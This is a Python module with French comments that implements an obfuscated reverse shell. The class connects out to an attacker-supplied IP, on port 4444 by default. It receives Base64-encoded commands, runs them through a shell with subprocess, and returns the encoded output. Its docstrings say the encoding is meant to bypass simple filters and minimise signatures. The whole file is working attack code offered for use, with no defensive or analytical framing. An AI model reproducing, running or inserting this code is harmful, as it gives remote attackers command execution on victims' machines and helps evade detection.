"""
Obfuscation Module
Techniques d'obfuscation pour masquer la communication
"""

import base64
import socket
import subprocess
from typing import Optional


class ReverseShellObfusquee:
    """
    Reverse Shell avec obfuscation basique
    - Encodage Base64 des communications
    - Minimise signatures
    """

    def __init__(self, attaquant_ip: str, attaquant_port: int = 4444):
        self.attaquant_ip = attaquant_ip
        self.attaquant_port = attaquant_port
        self.socket: Optional[socket.socket] = None

    def encoder_message(self, message: str) -> bytes:
        """
        Encode un message en Base64

        Obfuscation basique: transforme texte en base64
        Contourne certains filtres simples
        """
        return base64.b64encode(message.encode('utf-8'))

    def decoder_message(self, donnees: bytes) -> str:
        """Décode un message Base64"""
        try:
            return base64.b64decode(donnees).decode('utf-8')
        except Exception:
            return ""

    def connecter(self) -> bool:
        """Établir connexion"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.attaquant_ip, self.attaquant_port))
            return True
        except Exception as e:
            print(f"[OBFUSCATION] Erreur connexion: {e}")
            return False

    def boucle_reception(self):
        """
        Boucle avec commun communications encodées en Base64
        """
        if not self.socket:
            return

        print("[OBFUSCATION] Boucle avec encodage Base64")

        try:
            while True:
                # Recevoir commande encodée
                donnees_encodees = self.socket.recv(1024)

                if not donnees_encodees:
                    break

                # Décoder commande
                commande = self.decoder_message(donnees_encodees)

                if not commande:
                    continue

                # Exécuter et encoder résultats
                resultats = self._executer_commande(commande)
                resultats_encodes = self.encoder_message(resultats)

                # Envoyer résultats encodés
                self.socket.send(resultats_encodes)

        except Exception as e:
            print(f"[OBFUSCATION] Erreur: {e}")

        finally:
            if self.socket:
                self.socket.close()

    def _executer_commande(self, commande: str) -> str:
        """Exécuter commande"""
        try:
            process = subprocess.Popen(
                commande,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            try:
                stdout, _ = process.communicate(timeout=30)
                return stdout
            except subprocess.TimeoutExpired:
                process.kill()
                return "[TIMEOUT]\n"

        except Exception as e:
            return f"[ERREUR] {str(e)}\n"
